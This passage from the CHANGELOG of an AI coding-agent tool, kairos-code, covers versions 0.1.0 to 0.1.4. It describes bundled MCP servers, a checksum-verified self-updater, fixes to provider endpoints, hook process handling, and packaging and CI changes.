  unconfigured*: nothing was reachable until you wrote an `mcp.yaml` by hand.
  They now arrive through a bundled plugin, `kairos-essentials`, loaded straight
  from the package: no npm, no pip, no network, no API key, and nothing copied
  into your home directory.

  Precedence is bundled defaults < `~/.kairos/mcp.yaml` <
  `<project>/.kairos/mcp.yaml`, merged field by field, so overriding one setting
  keeps the rest, and `enabled: false` turns a server off. Entries use
  `bundled: <name>` — resolved to whatever launch actually works in this
  install (a `-m` module from a checkout, a built-in flag from a packaged
  build) — and `{project_dir}`, which is also the sandbox root the filesystem
  and git servers work in.

  `GET /api/extensions/capabilities` now reports each server's `source`
  (`bundled-plugin` / `user` / `project`) and separately lists the plugins this
  build ships, the ones the user installed and the ones the registry could
  install — so "what did I get?" and "why is this here?" are both answerable.
  `kairos-essentials/mcp.yaml` also lists the common servers that need *your*
  account (github, gitlab, notion, linear, slack, postgres, redis, sentry,
  cloudflare, brave-search) and the ones that only need Node (playwright,
  puppeteer, context7, sequential-thinking, memory) with their real commands,
  ready to copy, with credentials read from the environment rather than stored.

- **Rename a project by double-clicking its name.** The sidebar's project list
  edits in place: double-click the name — including the "untitled" placeholder —
  type, Enter. Escape cancels, an empty name is refused, and the write goes
  through `PATCH /api/projects/{id}`, so the new name is what the list, the chat
  header and the gate report all show. It is optimistic: the list updates at
  once and rolls back if the write fails.

- **The app can update itself — one click, and only when it can prove what it
  downloads.** A cached, read-only check against GitHub Releases
  (`GET /api/update/check`) feeds a banner in the app shell and a version row in
  About; **Update now** downloads the release asset, verifies the SHA-256 the
  same CI run published in `SHA256SUMS`, and hands the swap to a detached helper
  that replaces the binary after you quit and starts it again. Where
  self-replacement is not possible — macOS, `pip`/source installs, a read-only
  install directory, a release with no published checksum — the banner says why
  and points at the release page. The release workflow now publishes
  `SHA256SUMS` for every artifact.

## [0.1.4] - 2026-09-13

### Added

- **Feedback that asks for nothing, and a route that cannot be missed.** The foot of the
  Settings drawer opens a box: write it, then review and submit the prefilled issue on
  GitHub. No email field, and the payload is exactly what the user typed — no version, no
  OS, no logs — with a test that fails if any of that ever changes. A markdown issue
  template carries the framing (form templates make GitHub drop the `body=` prefill), and a
  workflow assigns each new issue to the maintainer and mentions them, so delivery does not
  hinge on anyone's notification settings.

### Fixed

- **A provider preset is the user's choice, not something re-derived from the fields.**
  The drawer re-ran `matchPreset` on every edit, and that function trusted a model *name*
  and a host *substring* — so picking "custom URL" with a model called `deepseek-*` snapped
  the selection back to the DeepSeek preset, and the endpoint the user typed was neither
  shown nor saved. The dropdown is now derived once from the loaded values; matching is by
  exact host and the model name is not consulted.

### Changed

- **`scripts/smoke_binary.py` ends the server's whole process tree.** A frozen app forks
  the real server, so terminating the pid it started left an invisible orphan holding the
  port — and, on Windows, a lock on the executable, which broke the next build.
- **`scripts/ci_shard.sh` bounds each file with `--timeout-method=signal` on Linux**, so a
  hung shard names the test it hung in instead of printing unrelated thread stacks.

## [0.1.3] - 2026-09-13

### Fixed

- **The endpoint edited in Settings is now the endpoint the client calls.** Provider
  configs carry `endpointUrl` (what the Settings drawer writes, and what the "test
  connection" probe used) and `baseUrl` (what the orchestrator's chat calls used) — two
  fields holding one fact, and the client only ever read the second. A user who switched
  their endpoint to DeepSeek in the drawer kept sending every conversation to the
  provider configured before it, and got that provider's Cloudflare block page — an
  error with nothing to do with the configuration on screen. `resolve_base_url()` makes
  `endpointUrl` authoritative (`baseUrl` stays the fallback) and strips the path the SDK
  must not receive — `/chat/completions`, `/messages` — including a trailing slash.
- **Provider failures are summarised instead of pasted.** An unreachable endpoint used to
  put several kilobytes of HTML (`<!DOCTYPE html>` … Cloudflare Ray ID …) into the chat
  bubble, because the HTTP client puts the response body in the exception and two call
  sites interpolated the exception verbatim. An HTML block page now keeps the host and
  the Ray ID and names what to check; anything else collapses to one line, capped at 280
  characters. An HTTP 401 says the key is missing or was rejected and where to set it —
  reproduced against a real endpoint, and the likeliest first-run failure.

### Documentation

- Corrected the comment on `data_dir`: the packaged desktop app pins its data directory
  to `%LOCALAPPDATA%/kairos-code` and ignores `KAIROS_DATA_DIR` — only the development
  server honours that variable.

## [0.1.2] - 2026-09-13

### Fixed

- **A hook that timed out could kill the process that ran it — on POSIX.** The
  cleanup path used `os.killpg(os.getpgid(child), SIGKILL)`, but hook commands were
  started without `start_new_session`, so the child shared *this* process's group
  and the kill took down the running process (and, in CI, the whole job) with it:
  exit 137 and no traceback. Hook commands now get their own session, and
  `_force_kill` refuses to signal a group it belongs to. Windows was unaffected
  (`taskkill`, no process groups), which is why every local run was green.
- **The Task tracker called passed rounds failed.** It parsed Reviewer verdicts by
  looking for `approve`, which only the pre-R38.7 rubric shape carries. The
  simplified Reviewer answers `{"has_bugs": ...}`, so every round of a run whose
  gate said *passed* was listed as "failed — round finished without a verdict".
  The simple shape now goes through the loop's own translation
  (`kairos.loop.reviewers._normalize_bug_verdict`), so the tracker cannot disagree
  with the gate, and payloads truncated at the 2000-character storage cap are
  still understood.
- **The test suite wrote into the developer's real data directory.** The data
  directory defaults to `<repo>/data`, and `tests/unit/test_memory_api.py` creates
  projects called `mem-api-test-<hex>` through the real persistence layer: running
  pytest filled `data/kairos.db` with them, and they then showed up in the sidebar
  of the README screenshots. `tests/conftest.py` points `KAIROS_DATA_DIR` at a
  throwaway directory for the whole session, and `tests/test_test_isolation.py`
  asserts the directory the app resolves is that one.
- **The History table wrapped run ids mid-string.** The Run column had no width,
  so on a narrow table an eight-character id broke across three lines. It has an
  explicit width and ellipsis.

### Changed

- **README screenshots are regenerated** from a clean, key-free demo run: no
  test-fixture projects in the sidebar, no hand-annotated example project, no
  Chinese in an English README, and the Task tracker agrees with the gate.
- **The licence is now the canonical AGPL-3.0 text**, so GitHub identifies it; the
  project's own copyright notice moved to the README's licence section.
- **CI runs each shard file by file**, one bounded pytest process per file, and
  prints free memory and the largest processes around each one. A module that
  blocks during import is invisible to pytest's `--timeout`, and a job killed by
  its own limit keeps no logs — both of which made a shard-sized hole impossible
  to diagnose.

## [0.1.1] - 2026-09-13

The first release that could be published end to end. Cutting 0.1.0 is what
surfaced these, and one of them could only ever appear on a tagged run.

### Fixed

- **The container image never reached ghcr.io.** `docker push` rejected the
  reference outright (`repository name ... must be lowercase`) because the account
  is `Kairos-ai-agent`; the image path is lowercased now. The image itself built
  and passed its smoke test in 0.1.0 — only the push failed.
- **Publishing could dead-end on an existing Release.** `gh release create` now
  updates an existing release instead of erroring, so re-cutting a tag to pick up
  a workflow fix works.
- **The Docker job can no longer gate a release.** It is out of the release job's
  `needs`, so a registry problem cannot stop a release from being published; the
  job still runs and still reports red.

### Changed

- **The Python suite runs in six CI shards with a 90-minute ceiling**, printing
  `--durations=0`. A job killed by its own timeout keeps no logs at all, which is
  why diagnosing this took several attempts.
- **Platform-sensitive tests now work on Linux.** `tests/test_landlock_ci.py`
  called a sandbox API that no longer exists — a `TypeError` for every Linux
  contributor, invisible where the module is skipped — and its signature guard
  accepted any signature at all. It now exercises the documented fd + `preexec_fn`
  mechanism, checks that a write inside the allowed root still succeeds, and
  asserts that building a ruleset does not confine the calling process.
- **README and CHANGELOG name the artifacts that exist** (the wheel attached to
  the release, and a container image built by the release workflow) instead of a
  PyPI name that is not published yet.

## [0.1.0] - 2026-09-13

The first public cut of the pipeline — a Coder/Reviewer loop with an enforced
score gate, cost accounting, an eval harness (record/replay/derive), model routing
across direct providers and LiteLLM, sandbox levels, an MCP client, hooks, agent
teams, skills, and the Web UI + CLI + TUI surfaces.

Three ways to run it, all built and smoke-tested by the release workflow before
they are published: a standalone binary per platform, a wheel that carries the Web
UI, and a container image.

### Added

- **Installable in three ways.** Standalone executables for Linux, macOS and
  Windows (no Python, no Node — unzip and run; it opens the UI in your browser);
  `pip install kairos_code-<version>-py3-none-any.whl` (the wheel attached to this
  release) for a real `kairos` command with the built Web UI inside; and a
  container image built and pushed to `ghcr.io/kairos-ai-agent/kairos-code` by the
  release workflow.
  Every artifact is verified before it is published: the wheel is installed into
  an empty virtualenv and must serve the UI, and each binary is started headless
  and must answer `/api/health` and return the bundled SPA.
- `kairos --version`.
- Optional extras for the integrations that are imported lazily: `voice`,
  `memory`, `browser`, `cloud`, `llm`, `telemetry`, `daemon` (the base install
  works without any of them).
- **Gate Report** — the receipt for a loop: rounds, scores, verdicts, issues,
  checkpoints, learned fixes and cost. Rendered as one self-contained HTML file
  (EN/中文 toggle built in), as Markdown for a PR description, or as JSON for CI.
  Available as `kairos gate report --project <id|name>` and
  `GET /api/projects/{id}/gate-report`.
- **`kairos demo`** — the whole review gate in about six seconds, with **no API
  key and no network**: the real loop runs against a scripted model on a tiny
  generated repo, and finishes by running that repo's own tests.
- **Three-view UI**: Run (did it pass / what did it cost / better than last
  time), History (every run with its verdict and spend) and Settings; the rest
  lives under a collapsed *Advanced* group. `?project=<id>` deep links.
- 63-language UI with on-demand locale chunks, RTL support and machine-translated
  dictionaries.
- A `clean install` CI job: an empty virtualenv with core dependencies only must
  be able to run `kairos --version`, the zero-key demo, and a real server start.

### Fixed

- **A clean install could not start the server.** `python-multipart` (required to
  register any form/upload route) and `aiosqlite` were imported but never
  declared, so a fresh `pip install` produced a package that died while importing
  the app — every published binary and every wheel. Nothing local could see it:
  a developer virtualenv has both packages anyway. Found by the first release dry
  run, on all three platforms.
- **The wheel shipped no Web UI.** `python -m build` builds the wheel from the
  sdist, and `web/dist` is generated (and gitignored) so it is not in an sdist;
  the wheel is now built from the tree, and both the build job and CI assert that
  `web/dist/index.html` and the console script are actually inside it.
- **The Docker image could not build**: the image never copied `hatch_build.py`,
  the custom wheel hook declared in `pyproject.toml`.
- Two tests asserted things the implementation never promised, and only failed on
  Linux — where contributors actually run them: one patched `sys.platform` while
  `_resolve_loop()` reads `os.name`, the other passed `Path()` as a "missing"
  allowed root (`Path()` is `.` and is always truthy).
- **Round history was never persisted.** The `loop_rounds` table, its loaders,
  the UI endpoints and the FTS mirror all existed, but no production code path
  wrote the row — so history vanished on restart and the Gate Report had no
  source. The loop now records each round.
- **Cost was reported as the whole ledger.** The cost ledger has no project
  column, so a run's report showed global spend. Cost is now scoped to the run's
  time window (and flagged when it has to fall back).
- A broad `.gitignore` rule (`settings.json`, unanchored) silently kept an i18n
  source fragment — 298 keys — out of the repository, so every fresh clone failed
  the i18n gate while the maintainer's working tree stayed green.
- `vendor/_oss/{anthropic-skills,superpowers}` were committed as gitlinks, so a
  clone got two empty directories instead of the 76 vendored files.
- `kairos/__init__.py` lazily imported `cli` in a way that recursed
  (`from kairos import cli` raised `RecursionError`).
- The in-process cost buffer and the JSONL ledger double-counted every call.
- `kairos exec`/agent runs refused any provider without an `api_key`, which made
  local or scripted providers unusable.
- Packaged deep links (`/run?project=…`, `/history`) returned 404: the API served
  the SPA without a history fallback.
- `loop.*` WebSocket events were dropped by a topic whitelist, which silently
  disabled the "switch session and refresh" behaviour.
- Checkpoints could commit the parent repository when a workspace lived inside it
  (once sweeping a 640 MB archive into history); commits are now scoped to the
  workspace and refuse to run without one.

### Changed

- The Reviewer reports **bugs only** (`{"has_bugs", "bugs", "summary"}`); the
  internal approve/score gate is unchanged.
- `kairos <subcommand>` no longer silently starts the server when the subcommand
  is unknown to the launcher's command list.
- The Python test job runs as three balanced shards (measured by runtime, not
  test count) with a per-test timeout, because the full suite needs 40+ minutes
  on a 2-vCPU runner and would otherwise be killed mid-suite.
